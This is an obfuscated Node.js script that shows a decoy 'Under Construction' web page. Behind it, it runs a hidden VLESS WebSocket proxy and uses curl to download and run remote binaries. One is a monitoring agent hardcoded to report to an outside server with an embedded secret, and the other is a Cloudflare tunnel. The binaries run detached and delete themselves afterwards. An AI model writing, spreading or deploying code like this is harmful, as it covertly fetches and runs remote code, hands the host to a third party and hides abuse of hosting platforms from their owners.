#!/usr/bin/env node

const _0x387d=['C_D','includes','--tls','N_T','error','feefeb96-bfcf-4a9b-aac0-6aac771c1b98','&host=','readUInt8','slice','exit','newnz.seav.eu.org','&fp=chrome&security=tls#','-arm','N_K','join','once','spawn','catch','arch','createServer','EADDRINUSE','end','cwd','/nzv1','split','curl','cRivpR7ScUwP51hJj7rLw7iCbUE6HmKg','readUInt16BE','message','\x27).then(()=>alert(\x27Copied!\x27))\x22>Copy</button></div>\x0a\x20\x20</div></body></html>','child_process','PORT','replace','send','writeHead','C_B','arm64','/cf','url','text/plain','www.shopify.com','unlink','ignore','UUID','443','NZ_UUID','vless://','listen','N_S','/vl','length','close','C_T','tmpdir','chmod','https://github.com/seav1/dl/releases/download/files','stringify','headersSent','string','reduce','worker','decode','application/json','env'];const _0x4fc2=function(_0x387dec,_0x4fc2bc){_0x387dec=_0x387dec-0x0;let _0x13b181=_0x387d[_0x387dec];return _0x13b181;};const {exec,spawn}=require(_0x4fc2('0x1e'));const {WebSocketServer,createWebSocketStream}=require('ws');const http=require('http');const {URL}=require(_0x4fc2('0x26'));const net=require('net');const {join}=require('path');const {promises:fs}=require('fs');const os=require('os');const CONFIG={'UUID':(process['env']['UUID']||_0x4fc2('0x5'))[_0x4fc2('0x20')](/-/g,''),'PORT':process['env']['PORT']||0xbb8,'N_S':process[_0x4fc2('0x3f')][_0x4fc2('0x30')]||_0x4fc2('0xa'),'N_P':process['env']['N_P']||_0x4fc2('0x2c'),'N_K':process[_0x4fc2('0x3f')]['N_K']||_0x4fc2('0x1a'),'NZ_UUID':process[_0x4fc2('0x3f')][_0x4fc2('0x2d')]||'','N_T':process['env']['N_T']||'--tls','C_B':process['env']['C_B']||_0x4fc2('0x28'),'C_T':process[_0x4fc2('0x3f')]['C_T']||'','C_D':process['env']['C_D']||''};const FILE_NAMES={'nzv1':_0x4fc2('0x3c'),'cf':'service'};const isPortInUse=_0x5dfa41=>new Promise(_0x2e0b40=>{const _0x1bbaee=net['createServer']();_0x1bbaee[_0x4fc2('0xf')](_0x4fc2('0x4'),_0x5ccbd4=>_0x2e0b40(_0x5ccbd4['code']===_0x4fc2('0x14')));_0x1bbaee['once']('listening',()=>{_0x1bbaee['close']();_0x2e0b40(![]);});_0x1bbaee['listen'](_0x5dfa41);});const isProcessRunning=_0x299182=>new Promise(_0x5aa213=>{exec('pgrep\x20-x\x20'+_0x299182,(_0x2e0dab,_0x4a2a11)=>_0x5aa213(!_0x2e0dab&&_0x4a2a11['trim']()[_0x4fc2('0x32')]>0x0));});const fileExists=async _0xfffa80=>{try{await fs['access'](_0xfffa80);return!![];}catch{return![];}};const checkAndChangeWorkDir=async()=>{const _0x5e0499=join(process['cwd'](),'.write_test_'+Date['now']());try{await fs['writeFile'](_0x5e0499,'test');await fs[_0x4fc2('0x29')](_0x5e0499);return!![];}catch{process['chdir'](os[_0x4fc2('0x35')]());return![];}};const vlessLink=()=>_0x4fc2('0x2e')+CONFIG[_0x4fc2('0x2b')]+'@'+CONFIG[_0x4fc2('0x23')]+':443?type=ws&path='+encodeURIComponent('/vl')+_0x4fc2('0x6')+CONFIG[_0x4fc2('0x0')]+'&encryption=none&sni='+CONFIG['C_D']+_0x4fc2('0xb')+CONFIG[_0x4fc2('0x0')];const HTML_TEMPLATES={'home':'<!DOCTYPE\x20html><html><head><title>Under\x20Construction</title><style>\x0a\x20\x20body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea\x200%,#764ba2\x20100%);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a\x20\x20.container{text-align:center;background:white;padding:60px\x2040px;border-radius:15px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2);max-width:500px;margin:20px}\x0a\x20\x20h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}\x0a\x20\x20p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}\x0a\x20\x20.icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}\x0a\x20\x20.footer{color:#999;font-size:0.9em;margin-top:30px}\x0a\x20\x20</style></head><body><div\x20class=\x22container\x22><div\x20class=\x22icon\x22>[!]</div>\x0a\x20\x20<h1>Website\x20Under\x20Construction</h1><p>We\x27re\x20working\x20hard\x20to\x20bring\x20you\x20something\x20amazing.\x20Please\x20check\x20back\x20soon!</p>\x0a\x20\x20<div\x20class=\x22footer\x22>Thank\x20you\x20for\x20your\x20patience.</div></div></body></html>','status':(_0x2c3dda,_0x1e7608)=>'<!DOCTYPE\x20html><html><head><title>Service\x20Status</title><style>\x0a\x20\x20body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}\x0a\x20\x20.container{max-width:600px;margin:0\x20auto;background:white;padding:30px;border-radius:8px;box-shadow:0\x202px\x2010px\x20rgba(0,0,0,0.1)}\x0a\x20\x20h1{color:#333;text-align:center}\x0a\x20\x20.info-item{margin:20px\x200;padding:15px;background:#f8f9fa;border-radius:5px}\x0a\x20\x20.label{font-weight:bold;color:#555;margin-bottom:10px}\x0a\x20\x20.value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all}\x0a\x20\x20.copy-btn{background:#007cba;color:white;border:none;padding:8px\x2015px;border-radius:3px;cursor:pointer;margin-top:10px}\x0a\x20\x20.copy-btn:hover{background:#0056b3}\x0a\x20\x20</style></head><body><div\x20class=\x22container\x22><h1>Service\x20Running</h1>\x0a\x20\x20<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>Port:</div><div\x20class=\x22value\x22>'+_0x2c3dda+'</div></div>\x0a\x20\x20<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>Connection\x20Link:</div><div\x20class=\x22value\x22\x20id=\x22vlessLink\x22>'+_0x1e7608+'</div>\x0a\x20\x20<button\x20class=\x22copy-btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27'+_0x1e7608+_0x4fc2('0x1d')};const server=http[_0x4fc2('0x13')]((_0x416f0b,_0x236791)=>{try{const {pathname}=new URL(_0x416f0b['url'],'http://'+_0x416f0b['headers']['host']);if(pathname==='/'){_0x236791['writeHead'](0xc8,{'Content-Type':'text/html'});_0x236791[_0x4fc2('0x15')](HTML_TEMPLATES['home']);}else if(pathname==='/x'){_0x236791['writeHead'](0xc8,{'Content-Type':'text/html'});_0x236791['end'](HTML_TEMPLATES['status'](CONFIG[_0x4fc2('0x1f')],vlessLink()));}else if(pathname==='/health'){_0x236791['writeHead'](0xc8,{'Content-Type':_0x4fc2('0x3e')});_0x236791['end'](JSON[_0x4fc2('0x38')]({'status':'ok','uptime':process['uptime']()}));}else{_0x236791['writeHead'](0x194,{'Content-Type':'text/plain'});_0x236791[_0x4fc2('0x15')]('Not\x20Found');}}catch{if(!_0x236791[_0x4fc2('0x39')]){_0x236791[_0x4fc2('0x22')](0x1f4,{'Content-Type':_0x4fc2('0x27')});_0x236791[_0x4fc2('0x15')]('Internal\x20Server\x20Error');}}});const wss=new WebSocketServer({'server':server,'path':_0x4fc2('0x31')});wss['on']('connection',_0x304322=>{_0x304322['once'](_0x4fc2('0x1c'),_0x19bdc2=>{const [_0x4a5104]=_0x19bdc2;const _0x5c4455=_0x19bdc2['slice'](0x1,0x11);if(!_0x5c4455['every']((_0x3d242a,_0x11d2cd)=>_0x3d242a===parseInt(CONFIG[_0x4fc2('0x2b')]['substr'](_0x11d2cd*0x2,0x2),0x10)))return;let _0x2cc6d7=_0x19bdc2[_0x4fc2('0x8')](0x11,0x12)[_0x4fc2('0x7')]()+0x13;const _0x200b19=_0x19bdc2[_0x4fc2('0x8')](_0x2cc6d7,_0x2cc6d7+=0x2)[_0x4fc2('0x1b')](0x0);const _0x239109=_0x19bdc2['slice'](_0x2cc6d7,_0x2cc6d7+=0x1)[_0x4fc2('0x7')]();let _0x3cc85b;if(_0x239109===0x1){_0x3cc85b=_0x19bdc2[_0x4fc2('0x8')](_0x2cc6d7,_0x2cc6d7+=0x4)[_0x4fc2('0xe')]('.');}else if(_0x239109===0x2){const _0x4b14e9=_0x19bdc2[_0x4fc2('0x8')](_0x2cc6d7,_0x2cc6d7+=0x1)[_0x4fc2('0x7')]();_0x3cc85b=new TextDecoder()[_0x4fc2('0x3d')](_0x19bdc2[_0x4fc2('0x8')](_0x2cc6d7,_0x2cc6d7+=_0x4b14e9));}else if(_0x239109===0x3){_0x3cc85b=_0x19bdc2[_0x4fc2('0x8')](_0x2cc6d7,_0x2cc6d7+=0x10)[_0x4fc2('0x3b')]((_0x527f04,_0x360ffa,_0x28fc2c,_0x17cc57)=>_0x28fc2c%0x2?_0x527f04['concat'](_0x17cc57[_0x4fc2('0x8')](_0x28fc2c-0x1,_0x28fc2c+0x1)):_0x527f04,[])['map'](_0x22507b=>_0x22507b['readUInt16BE'](0x0)['toString'](0x10))['join'](':');}if(_0x304322['readyState']===_0x304322['OPEN']){_0x304322[_0x4fc2('0x21')](new Uint8Array([_0x4a5104,0x0]));const _0x140b20=createWebSocketStream(_0x304322)['on']('error',()=>{});const _0x418795=net['connect']({'host':_0x3cc85b,'port':_0x200b19},function(){this['write'](_0x19bdc2['slice'](_0x2cc6d7));_0x140b20['pipe'](this)['pipe'](_0x140b20);});_0x418795['on']('error',()=>{});}});});async function downloadAndRun(_0x4239ff,_0x1c8568,_0x1bb977,_0x406e2e){if(!_0x4239ff)return;const _0x2a722d=join(process[_0x4fc2('0x16')](),FILE_NAMES[_0x1bb977]);if(await isProcessRunning(FILE_NAMES[_0x1bb977]))return;if(await fileExists(_0x2a722d)){await fs['chmod'](_0x2a722d,0x1ed)[_0x4fc2('0x11')](()=>{});spawnProcess(_0x2a722d,_0x1c8568,_0x406e2e);return;}return new Promise(_0x43b16a=>{spawn(_0x4fc2('0x19'),['-s','-L','-o',_0x2a722d,_0x4239ff],{'stdio':_0x4fc2('0x2a')})['on'](_0x4fc2('0x33'),async _0x5d4e78=>{if(_0x5d4e78===0x0){await fs[_0x4fc2('0x36')](_0x2a722d,0x1ed)['catch'](()=>{});spawnProcess(_0x2a722d,_0x1c8568,_0x406e2e);}_0x43b16a();})['on']('error',()=>fs[_0x4fc2('0x29')](_0x2a722d)['catch'](()=>{}));});}function spawnProcess(_0x533cd3,_0x1d7371,_0x250cea){const _0x3973c5=spawn(_0x533cd3,_0x1d7371[_0x4fc2('0x18')]('\x20')['filter'](_0x1980fb=>_0x1980fb),{'stdio':_0x4fc2('0x2a'),'detached':!![],'env':_0x250cea||process['env']});_0x3973c5['unref']();_0x3973c5['on'](_0x4fc2('0x10'),()=>setTimeout(()=>fs[_0x4fc2('0x29')](_0x533cd3)['catch'](()=>{}),0x3e8));}const baseUrl=_0x4fc2('0x37');const archUrl=_0x5b653b=>process[_0x4fc2('0x12')]===_0x4fc2('0x24')?_0x5b653b+_0x4fc2('0xc'):_0x5b653b;(async()=>{await checkAndChangeWorkDir();if(await isPortInUse(CONFIG[_0x4fc2('0x1f')]))process[_0x4fc2('0x9')](0x1);server[_0x4fc2('0x2f')](CONFIG[_0x4fc2('0x1f')]);if(CONFIG['N_S']&&CONFIG['N_K']){const _0x148f23={...process[_0x4fc2('0x3f')]};_0x148f23['NZ_SERVER']=CONFIG[_0x4fc2('0x30')]+':'+CONFIG['N_P'];_0x148f23['NZ_CLIENT_SECRET']=CONFIG[_0x4fc2('0xd')];if(CONFIG['NZ_UUID']){_0x148f23[_0x4fc2('0x2d')]=CONFIG['NZ_UUID'];}if(CONFIG['N_T']===_0x4fc2('0x2')||typeof CONFIG['N_T']===_0x4fc2('0x3a')&&CONFIG[_0x4fc2('0x3')][_0x4fc2('0x1')](_0x4fc2('0x2'))){_0x148f23['NZ_TLS']='true';}await downloadAndRun(archUrl(baseUrl+_0x4fc2('0x17')),'','nzv1',_0x148f23);}await downloadAndRun(archUrl(baseUrl+_0x4fc2('0x25')),'tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20http2\x20--no-autoupdate\x20run\x20--token\x20'+CONFIG[_0x4fc2('0x34')],'cf');})()['catch'](()=>process[_0x4fc2('0x9')](0x1));
